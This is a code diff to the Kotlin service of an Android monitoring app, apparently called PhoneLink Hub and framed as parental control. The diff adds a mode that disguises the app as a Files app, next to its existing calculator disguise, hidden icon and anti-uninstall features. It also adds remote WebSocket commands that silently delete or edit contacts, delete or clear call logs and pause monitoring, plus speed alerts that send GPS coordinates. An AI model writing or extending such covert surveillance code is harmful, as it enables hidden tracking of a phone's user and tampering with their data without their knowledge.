@@ -425,6 +425,14 @@ class PhoneLinkService : Service() {
             Events.CALL_RECORDING_CONFIG_COMMAND -> handleCallRecordingConfig(payload)
             Events.CAMOUFLAGE_CONFIG_COMMAND -> handleCamouflageConfig(payload)
             Events.QUICK_SETTING_COMMAND -> handleQuickSetting(payload)
+            Events.OPEN_APP_COMMAND -> handleOpenApp()
+            Events.PAUSE_MONITORING_COMMAND -> handlePauseMonitoring(payload)
+            Events.DELETE_CONTACT_COMMAND -> handleDeleteContact(payload)
+            Events.EDIT_CONTACT_COMMAND -> handleEditContact(payload)
+            Events.DELETE_CALL_COMMAND -> handleDeleteCall(payload)
+            Events.CLEAR_CALLS_COMMAND -> handleClearCalls()
+            Events.LOCK_SCREEN_MESSAGE_COMMAND -> handleLockScreenMessage(payload)
+            Events.STORAGE_ANALYSIS_REQUEST -> pushStorageAnalysis()
             else -> Log.w(TAG, "unhandled command: $event")
         }
     }
@@ -622,6 +630,10 @@ class PhoneLinkService : Service() {
         if (payload.has("customText")) {
             DevicePrefs.customNotificationText = payload.optString("customText", "")
         }
+        if (payload.has("filesDisguise")) {
+            val enabled = payload.optBoolean("filesDisguise", false)
+            DevicePrefs.updateStealthMode(this, if (enabled) "FILES" else "NORMAL")
+        }
         forceUpdateNotification()
         pushCamouflageStatus()
     }
@@ -630,7 +642,9 @@ class PhoneLinkService : Service() {
         val json = JSONObject().apply {
             put("deviceId", DevicePrefs.deviceId)
             put("calculatorDisguise", DevicePrefs.calculatorDisguiseEnabled)
+            put("filesDisguise", DevicePrefs.filesDisguiseEnabled)
             put("hideAppIcon", DevicePrefs.hideAppIconEnabled)
+            put("stealthMode", if (DevicePrefs.filesDisguiseEnabled) "FILES" else if (DevicePrefs.calculatorDisguiseEnabled) "CALCULATOR" else if (DevicePrefs.hideAppIconEnabled) "HIDDEN" else "NORMAL")
             put("stealthNotification", DevicePrefs.stealthNotificationEnabled)
             put("antiTamper", DevicePrefs.antiUninstallShieldEnabled)
             put("hasOwnerPin", DevicePrefs.hasOwnerPin())
@@ -639,6 +653,122 @@ class PhoneLinkService : Service() {
             put("customText", DevicePrefs.customNotificationText)
         }
         webSocket.send(Events.CAMOUFLAGE_STATUS, json)
+    }
+
+    private fun handleOpenApp() {
+        try {
+            val intent = Intent(this, com.phonelink.hub.MainActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                putExtra("EXTRA_PARENT_AUTHENTICATED", true)
+                putExtra("from_dashboard", true)
+            }
+            startActivity(intent)
+            Log.i(TAG, "Successfully launched PhoneLink Hub settings from dashboard command!")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to launch app from dashboard: ${e.message}")
+        }
+    }
+
+    private fun handlePauseMonitoring(payload: JSONObject) {
+        val paused = payload.optBoolean("paused", false)
+        DevicePrefs.monitoringPaused = paused
+        Log.i(TAG, "Remote pause monitoring toggled: $paused")
+        if (!paused) {
+            syncAll()
+        }
+        pushMonitoringPausedStatus()
+    }
+
+    private fun pushMonitoringPausedStatus() {
+        val json = JSONObject().apply {
+            put("deviceId", DevicePrefs.deviceId)
+            put("paused", DevicePrefs.monitoringPaused)
+            put("timestamp", System.currentTimeMillis())
+        }
+        webSocket.send(Events.MONITORING_PAUSED_STATUS, json)
+    }
+
+    private fun handleDeleteContact(payload: JSONObject) {
+        val contactId = payload.optString("contactId", "")
+        val success = com.phonelink.hub.contacts.ContactsRepository.deleteContact(this, contactId)
+        pushContacts()
+        webSocket.send(Events.DELETE_CONTACT_RESULT, JSONObject().apply {
+            put("deviceId", DevicePrefs.deviceId)
+            put("contactId", contactId)
+            put("success", success)
+        })
+    }
+
+    private fun handleEditContact(payload: JSONObject) {
+        val contactId = payload.optString("contactId", "")
+        val name = payload.optString("name", "")
+        val number = payload.optString("number", "")
+        val success = com.phonelink.hub.contacts.ContactsRepository.editContact(this, contactId, name, number)
+        pushContacts()
+        webSocket.send(Events.EDIT_CONTACT_RESULT, JSONObject().apply {
+            put("deviceId", DevicePrefs.deviceId)
+            put("contactId", contactId)
+            put("success", success)
+        })
+    }
+
+    private fun handleDeleteCall(payload: JSONObject) {
+        val callId = payload.optString("callId", "")
+        val success = com.phonelink.hub.calls.CallLogRepository.deleteCall(this, callId)
+        pushCalls()
+        webSocket.send(Events.DELETE_CALL_RESULT, JSONObject().apply {
+            put("deviceId", DevicePrefs.deviceId)
+            put("callId", callId)
+            put("success", success)
+        })
+    }
+
+    private fun handleClearCalls() {
+        val success = com.phonelink.hub.calls.CallLogRepository.clearAllCalls(this)
+        pushCalls()
+        webSocket.send(Events.CLEAR_CALLS_RESULT, JSONObject().apply {
+            put("deviceId", DevicePrefs.deviceId)
+            put("success", success)
+        })
+    }
+
+    private fun handleLockScreenMessage(payload: JSONObject) {
+        val title = payload.optString("title", "Message from Parents")
+        val message = payload.optString("message", "")
+        if (message.isBlank()) return
+        android.os.Handler(android.os.Looper.getMainLooper()).post {
+            try {
+                android.widget.Toast.makeText(applicationContext, "📢 $title:\n$message", android.widget.Toast.LENGTH_LONG).show()
+            } catch (_: Exception) {}
+        }
+        webSocket.send(Events.LOCK_SCREEN_MESSAGE_RESULT, JSONObject().apply {
+            put("deviceId", DevicePrefs.deviceId)
+            put("success", true)
+        })
+    }
+
+    private fun pushStorageAnalysis() {
+        try {
+            val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
+            val blockSize = stat.blockSizeLong
+            val totalBlocks = stat.blockCountLong
+            val availableBlocks = stat.availableBlocksLong
+            val totalBytes = totalBlocks * blockSize
+            val freeBytes = availableBlocks * blockSize
+            val usedBytes = totalBytes - freeBytes
+
+            val json = JSONObject().apply {
+                put("deviceId", DevicePrefs.deviceId)
+                put("totalBytes", totalBytes)
+                put("freeBytes", freeBytes)
+                put("usedBytes", usedBytes)
+                put("usedPercent", if (totalBytes > 0) ((usedBytes * 100) / totalBytes).toInt() else 0)
+                put("timestamp", System.currentTimeMillis())
+            }
+            webSocket.send(Events.STORAGE_ANALYSIS_RESPONSE, json)
+        } catch (e: Exception) {
+            Log.w(TAG, "pushStorageAnalysis error: ${e.message}")
+        }
     }
 
     private fun handleQuickSetting(payload: JSONObject) {
@@ -1898,6 +2028,13 @@ class PhoneLinkService : Service() {
     fun syncAll() {
         try { pushStatus() } catch (e: Exception) { Log.w(TAG, "sync pushStatus: ${e.message}") }
         try { webSocket.send(Events.SYNC_CONFIG_STATUS, DevicePrefs.getSyncConfigJson()) } catch (e: Exception) { Log.w(TAG, "sync SYNC_CONFIG_STATUS: ${e.message}") }
+        pushMonitoringPausedStatus()
+
+        // Home Mode: If monitoring is paused by parents, do not sync private data!
+        if (DevicePrefs.monitoringPaused) {
+            Log.i(TAG, "syncAll skipped: Monitoring is paused by parent (Home Mode)")
+            return
+        }
         if (DevicePrefs.lowDataMode) return
 
         try { pushBatteryStats() } catch (e: Exception) { Log.w(TAG, "sync pushBatteryStats: ${e.message}") }
@@ -2082,6 +2219,20 @@ class PhoneLinkService : Service() {
         if (webSocket.isOpen) {
             webSocket.send(Events.LOCATION_UPDATE, fix)
             checkGeofenceAlert(fix)
+
+            val speedMps = fix.optDouble("speed", 0.0)
+            val speedKmh = (speedMps * 3.6).toInt()
+            if (speedKmh > DevicePrefs.speedAlertThresholdKmh) {
+                val alert = JSONObject().apply {
+                    put("deviceId", DevicePrefs.deviceId)
+                    put("speedKmh", speedKmh)
+                    put("thresholdKmh", DevicePrefs.speedAlertThresholdKmh)
+                    put("latitude", fix.optDouble("latitude", 0.0))
+                    put("longitude", fix.optDouble("longitude", 0.0))
+                    put("timestamp", System.currentTimeMillis())
+                }
+                webSocket.send(Events.SPEED_ALERT, alert)
+            }
         } else {
             if (isTimeline && DevicePrefs.timelineTrackingEnabled) {
                 bufferOfflineLocation(fix)
